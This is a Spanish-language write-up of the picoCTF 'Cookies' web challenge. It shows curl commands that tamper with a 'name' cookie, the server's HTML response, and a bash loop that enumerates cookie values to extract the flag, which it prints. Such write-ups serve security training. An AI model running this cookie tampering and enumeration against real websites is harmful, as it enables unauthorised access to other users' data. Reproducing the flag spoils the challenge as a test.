## Descripción
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:27177/

¿A quién no le gustan las cookies? Intenta descubrir la mejor. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)
## Solución
En la página nos pide ingresar galletas (cookies) que le gustan, internamente la cookie que maneja las galletas validas es la llamada `name`, la cual cambia de valor con cada galleta que ingresamos.
Para poder encontrar la galleta correcta modificamos la cookie hasta encontrar la bandera, esto de la siguiente manera:

En una terminal Linux mandamos una cookie `name` modificada con 
```bash
curl http://mercury.picoctf.net:27177/check -H 'Cookie: name=18'
```
y obtenemos lo siguiente: 
```HTML
  <!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->


        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>



        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>   
```
Cuando modificamos el valor `name` del comando obtenemos un resultado distinto, y tenemos que descubrir el valor correcto que contenga la bandera, para esto usamos el comando
```bash
for i in {1..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name = $i"; done | grep -oE "picoCTF{.*?}"
```
Con esto creamos un ciclo `for` para probar los valores del 1 al 20 para `name` y usando `grep` junto a una expresión regular para mostrar solo la coincidencia de `picoCTF{...}`, obteniendo la bandera `picoCTF{3v3ry1_l0v3s_c00k135_064663be}`